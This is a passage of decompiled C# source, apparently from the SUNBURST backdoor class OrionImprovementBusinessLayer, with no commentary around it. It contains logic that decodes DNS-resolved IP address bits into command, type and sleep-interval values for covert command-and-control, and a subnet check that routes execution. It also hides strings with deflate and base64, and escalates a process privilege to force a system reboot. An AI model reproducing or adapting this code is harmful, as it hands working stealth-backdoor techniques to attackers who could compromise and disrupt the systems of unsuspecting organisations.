			private const int dnSize = 32;

			// Token: 0x04000300 RID: 768
			private const int dnCount = 36;

			// Token: 0x04000301 RID: 769
			private readonly byte[] guid;

			// Token: 0x04000302 RID: 770
			private readonly string dnStr;

			// Token: 0x04000303 RID: 771
			private string dnStrLower;

			// Token: 0x04000304 RID: 772
			private int nCount;

			// Token: 0x04000305 RID: 773
			private int offset;
		}

		// Token: 0x020000D8 RID: 216
		private class DnsRecords
		{
			// Token: 0x04000306 RID: 774
			public int A;

			// Token: 0x04000307 RID: 775
			public int _type;

			// Token: 0x04000308 RID: 776
			public int length;

			// Token: 0x04000309 RID: 777
			public string cname;

			// Token: 0x0400030A RID: 778
			public bool dnssec;
		}

		// Token: 0x020000D9 RID: 217
		private class IPAddressesHelper
		{
			// Token: 0x060009BE RID: 2494 RVA: 0x00046591 File Offset: 0x00044791
			public IPAddressesHelper(string subnet, string mask, OrionImprovementBusinessLayer.AddressFamilyEx family, bool ext)
			{
				this.family = family;
				this.subnet = IPAddress.Parse(subnet);
				this.mask = IPAddress.Parse(mask);
				this.ext = ext;
			}

			// Token: 0x060009BF RID: 2495 RVA: 0x000465C0 File Offset: 0x000447C0
			public IPAddressesHelper(string subnet, string mask, OrionImprovementBusinessLayer.AddressFamilyEx family) : this(subnet, mask, family, false)
			{
			}

			// Token: 0x060009C0 RID: 2496 RVA: 0x000465CC File Offset: 0x000447CC
			public static void GetAddresses(IPAddress address, OrionImprovementBusinessLayer.DnsRecords rec)
			{
				Random random = new Random();
				byte[] addressBytes = address.GetAddressBytes();
				int num = (int)(addressBytes[(int)((long)addressBytes.Length) - 2] & 10);
				if (num != 2)
				{
					if (num != 8)
					{
						if (num != 10)
						{
							rec.length = 0;
						}
						else
						{
							rec.length = 3;
						}
					}
					else
					{
						rec.length = 2;
					}
				}
				else
				{
					rec.length = 1;
				}
				num = (int)(addressBytes[(int)((long)addressBytes.Length) - 1] & 136);
				if (num != 8)
				{
					if (num != 128)
					{
						if (num != 136)
						{
							rec._type = 0;
						}
						else
						{
							rec._type = 3;
						}
					}
					else
					{
						rec._type = 2;
					}
				}
				else
				{
					rec._type = 1;
				}
				num = (int)(addressBytes[(int)((long)addressBytes.Length) - 1] & 84);
				if (num <= 20)
				{
					if (num == 4)
					{
						rec.A = random.Next(240, 300);
						return;
					}
					if (num == 16)
					{
						rec.A = random.Next(480, 600);
						return;
					}
					if (num == 20)
					{
						rec.A = random.Next(1440, 1560);
						return;
					}
				}
				else if (num <= 68)
				{
					if (num == 64)
					{
						rec.A = random.Next(4320, 5760);
						return;
					}
					if (num == 68)
					{
						rec.A = random.Next(10020, 10140);
						return;
					}
				}
				else
				{
					if (num == 80)
					{
						rec.A = random.Next(20100, 20220);
						return;
					}
					if (num == 84)
					{
						rec.A = random.Next(43140, 43260);
						return;
					}
				}
				rec.A = 0;
			}

			// Token: 0x060009C1 RID: 2497 RVA: 0x00046760 File Offset: 0x00044960
			public static OrionImprovementBusinessLayer.AddressFamilyEx GetAddressFamily(IPAddress address)
			{
				bool flag;
				return OrionImprovementBusinessLayer.IPAddressesHelper.GetAddressFamily(address, out flag);
			}

			// Token: 0x060009C2 RID: 2498 RVA: 0x00046778 File Offset: 0x00044978
			public static OrionImprovementBusinessLayer.AddressFamilyEx GetAddressFamily(IPAddress address, out bool ext)
			{
				ext = false;
				try
				{
					if (IPAddress.IsLoopback(address) || address.Equals(IPAddress.Any) || address.Equals(IPAddress.IPv6Any))
					{
						return OrionImprovementBusinessLayer.AddressFamilyEx.Atm;
					}
					if (address.AddressFamily == AddressFamily.InterNetworkV6)
					{
						byte[] addressBytes = address.GetAddressBytes();
						if (addressBytes.Take(10).All((byte b) => b == 0) && addressBytes[10] == addressBytes[11] && (addressBytes[10] == 0 || addressBytes[10] == 255))
						{
							address = address.MapToIPv4();
						}
					}
					else if (address.AddressFamily != AddressFamily.InterNetwork)
					{
						return OrionImprovementBusinessLayer.AddressFamilyEx.Unknown;
					}
					byte[] addressBytes2 = address.GetAddressBytes();
					foreach (OrionImprovementBusinessLayer.IPAddressesHelper ipaddressesHelper in OrionImprovementBusinessLayer.nList)
					{
						byte[] addressBytes3 = ipaddressesHelper.subnet.GetAddressBytes();
						byte[] addressBytes4 = ipaddressesHelper.mask.GetAddressBytes();
						if (addressBytes2.Length == addressBytes4.Length && addressBytes2.Length == addressBytes3.Length)
						{
							bool flag = true;
							for (int j = 0; j < addressBytes2.Length; j++)
							{
								if ((addressBytes2[j] & addressBytes4[j]) != (addressBytes3[j] & addressBytes4[j]))
								{
									flag = false;
									break;
								}
							}
							if (flag)
							{
								ext = ipaddressesHelper.ext;
								return ipaddressesHelper.family;
							}
						}
					}
					return (address.AddressFamily == AddressFamily.InterNetworkV6) ? OrionImprovementBusinessLayer.AddressFamilyEx.InterNetworkV6 : OrionImprovementBusinessLayer.AddressFamilyEx.InterNetwork;
				}
				catch (Exception)
				{
				}
				return OrionImprovementBusinessLayer.AddressFamilyEx.Error;
			}

			// Token: 0x0400030B RID: 779
			private readonly IPAddress subnet;

			// Token: 0x0400030C RID: 780
			private readonly IPAddress mask;

			// Token: 0x0400030D RID: 781
			private readonly OrionImprovementBusinessLayer.AddressFamilyEx family;

			// Token: 0x0400030E RID: 782
			private readonly bool ext;
		}

		// Token: 0x020000DA RID: 218
		private static class ZipHelper
		{
			// Token: 0x060009C3 RID: 2499 RVA: 0x000468FC File Offset: 0x00044AFC
			public static byte[] Compress(byte[] input)
			{
				byte[] result;
				using (MemoryStream memoryStream = new MemoryStream(input))
				{
					using (MemoryStream memoryStream2 = new MemoryStream())
					{
						using (DeflateStream deflateStream = new DeflateStream(memoryStream2, CompressionMode.Compress))
						{
							memoryStream.CopyTo(deflateStream);
						}
						result = memoryStream2.ToArray();
					}
				}
				return result;
			}

			// Token: 0x060009C4 RID: 2500 RVA: 0x00046978 File Offset: 0x00044B78
			public static byte[] Decompress(byte[] input)
			{
				byte[] result;
				using (MemoryStream memoryStream = new MemoryStream(input))
				{
					using (MemoryStream memoryStream2 = new MemoryStream())
					{
						using (DeflateStream deflateStream = new DeflateStream(memoryStream, CompressionMode.Decompress))
						{
							deflateStream.CopyTo(memoryStream2);
						}
						result = memoryStream2.ToArray();
					}
				}
				return result;
			}

			// Token: 0x060009C5 RID: 2501 RVA: 0x000469F4 File Offset: 0x00044BF4
			public static string Zip(string input)
			{
				if (string.IsNullOrEmpty(input))
				{
					return input;
				}
				string result;
				try
				{
					result = Convert.ToBase64String(OrionImprovementBusinessLayer.ZipHelper.Compress(Encoding.UTF8.GetBytes(input)));
				}
				catch (Exception)
				{
					result = "";
				}
				return result;
			}

			// Token: 0x060009C6 RID: 2502 RVA: 0x00046A40 File Offset: 0x00044C40
			public static string Unzip(string input)
			{
				if (string.IsNullOrEmpty(input))
				{
					return input;
				}
				string result;
				try
				{
					byte[] bytes = OrionImprovementBusinessLayer.ZipHelper.Decompress(Convert.FromBase64String(input));
					result = Encoding.UTF8.GetString(bytes);
				}
				catch (Exception)
				{
					result = input;
				}
				return result;
			}
		}

		// Token: 0x020000DB RID: 219
		public class NativeMethods
		{
			// Token: 0x060009C7 RID: 2503
			[ReliabilityContract(Consistency.WillNotCorruptState, Cer.MayFail)]
			[DllImport("kernel32.dll", SetLastError = true)]
			[return: MarshalAs(UnmanagedType.Bool)]
			private static extern bool CloseHandle(IntPtr handle);

			// Token: 0x060009C8 RID: 2504
			[ReliabilityContract(Consistency.WillNotCorruptState, Cer.MayFail)]
			[DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
			[return: MarshalAs(UnmanagedType.Bool)]
			private static extern bool AdjustTokenPrivileges([In] IntPtr TokenHandle, [MarshalAs(UnmanagedType.Bool)] [In] bool DisableAllPrivileges, [In] ref OrionImprovementBusinessLayer.NativeMethods.TOKEN_PRIVILEGE NewState, [In] uint BufferLength, [In] [Out] ref OrionImprovementBusinessLayer.NativeMethods.TOKEN_PRIVILEGE PreviousState, [In] [Out] ref uint ReturnLength);

			// Token: 0x060009C9 RID: 2505
			[ReliabilityContract(Consistency.WillNotCorruptState, Cer.MayFail)]
			[DllImport("advapi32.dll", CharSet = CharSet.Unicode, EntryPoint = "LookupPrivilegeValueW", SetLastError = true)]
			[return: MarshalAs(UnmanagedType.Bool)]
			private static extern bool LookupPrivilegeValue([In] string lpSystemName, [In] string lpName, [In] [Out] ref OrionImprovementBusinessLayer.NativeMethods.LUID Luid);

			// Token: 0x060009CA RID: 2506
			[ReliabilityContract(Consistency.WillNotCorruptState, Cer.MayFail)]
			[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
			private static extern IntPtr GetCurrentProcess();

			// Token: 0x060009CB RID: 2507
			[ReliabilityContract(Consistency.WillNotCorruptState, Cer.MayFail)]
			[DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
			[return: MarshalAs(UnmanagedType.Bool)]
			private static extern bool OpenProcessToken([In] IntPtr ProcessToken, [In] TokenAccessLevels DesiredAccess, [In] [Out] ref IntPtr TokenHandle);

			// Token: 0x060009CC RID: 2508
			[DllImport("advapi32.dll", CharSet = CharSet.Unicode, EntryPoint = "InitiateSystemShutdownExW", SetLastError = true)]
			[return: MarshalAs(UnmanagedType.Bool)]
			public static extern bool InitiateSystemShutdownEx([In] string lpMachineName, [In] string lpMessage, [In] uint dwTimeout, [MarshalAs(UnmanagedType.Bool)] [In] bool bForceAppsClosed, [MarshalAs(UnmanagedType.Bool)] [In] bool bRebootAfterShutdown, [In] uint dwReason);

			// Token: 0x060009CD RID: 2509 RVA: 0x00046A88 File Offset: 0x00044C88
			public static bool RebootComputer()
			{
				bool flag = false;
				bool result;
				try
				{
					bool newState = false;
					string privilege = OrionImprovementBusinessLayer.ZipHelper.Unzip("C04NzigtSckvzwsoyizLzElNTwUA");
					if (!OrionImprovementBusinessLayer.NativeMethods.SetProcessPrivilege(privilege, true, out newState))
					{
						result = flag;
					}
					else
					{
						flag = OrionImprovementBusinessLayer.NativeMethods.InitiateSystemShutdownEx(null, null, 0U, true, true, 2147745794U);
						OrionImprovementBusinessLayer.NativeMethods.SetProcessPrivilege(privilege, newState, out newState);
						result = flag;
					}
				}
				catch (Exception)
				{
					result = flag;
				}
				return result;
			}

			// Token: 0x060009CE RID: 2510 RVA: 0x00046AE8 File Offset: 0x00044CE8
			public static bool SetProcessPrivilege(string privilege, bool newState, out bool previousState)
			{
				bool flag = false;
				previousState = false;
				bool result;
				try
				{
					IntPtr zero = IntPtr.Zero;
					OrionImprovementBusinessLayer.NativeMethods.LUID luid = default(OrionImprovementBusinessLayer.NativeMethods.LUID);
					luid.LowPart = 0U;
					luid.HighPart = 0U;
					if (!OrionImprovementBusinessLayer.NativeMethods.OpenProcessToken(OrionImprovementBusinessLayer.NativeMethods.GetCurrentProcess(), TokenAccessLevels.Query | TokenAccessLevels.AdjustPrivileges, ref zero))
					{
						result = false;
					}
					else if (!OrionImprovementBusinessLayer.NativeMethods.LookupPrivilegeValue(null, privilege, ref luid))
					{
						OrionImprovementBusinessLayer.NativeMethods.CloseHandle(zero);
						result = false;
					}
					else
					{
						OrionImprovementBusinessLayer.NativeMethods.TOKEN_PRIVILEGE token_PRIVILEGE = default(OrionImprovementBusinessLayer.NativeMethods.TOKEN_PRIVILEGE);
						OrionImprovementBusinessLayer.NativeMethods.TOKEN_PRIVILEGE token_PRIVILEGE2 = default(OrionImprovementBusinessLayer.NativeMethods.TOKEN_PRIVILEGE);
						token_PRIVILEGE.PrivilegeCount = 1U;
						token_PRIVILEGE.Privilege.Luid = luid;
						token_PRIVILEGE.Privilege.Attributes = (newState ? 2U : 0U);
						uint num = 0U;
						OrionImprovementBusinessLayer.NativeMethods.AdjustTokenPrivileges(zero, false, ref token_PRIVILEGE, (uint)Marshal.SizeOf(token_PRIVILEGE2), ref token_PRIVILEGE2, ref num);
						previousState = ((token_PRIVILEGE2.Privilege.Attributes & 2U) > 0U);
						flag = true;
						OrionImprovementBusinessLayer.NativeMethods.CloseHandle(zero);
						result = flag;
					}
				}
				catch (Exception)
				{
					result = flag;
				}
				return result;
			}

			// Token: 0x0400030F RID: 783
			private const uint SE_PRIVILEGE_DISABLED = 0U;

			// Token: 0x04000310 RID: 784
			private const uint SE_PRIVILEGE_ENABLED = 2U;

			// Token: 0x04000311 RID: 785
			private const string ADVAPI32 = "advapi32.dll";

			// Token: 0x04000312 RID: 786
			private const string KERNEL32 = "kernel32.dll";

			// Token: 0x020001C8 RID: 456
			[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
			private struct LUID
			{
				// Token: 0x040005C8 RID: 1480
				public uint LowPart;

				// Token: 0x040005C9 RID: 1481
				public uint HighPart;
			}

			// Token: 0x020001C9 RID: 457
			[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
			private struct LUID_AND_ATTRIBUTES
			{
				// Token: 0x040005CA RID: 1482
				public OrionImprovementBusinessLayer.NativeMethods.LUID Luid;

				// Token: 0x040005CB RID: 1483
				public uint Attributes;
			}

			// Token: 0x020001CA RID: 458
			[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
			private struct TOKEN_PRIVILEGE
			{
				// Token: 0x040005CC RID: 1484
				public uint PrivilegeCount;

				// Token: 0x040005CD RID: 1485
				public OrionImprovementBusinessLayer.NativeMethods.LUID_AND_ATTRIBUTES Privilege;
			}
		}
	}
}
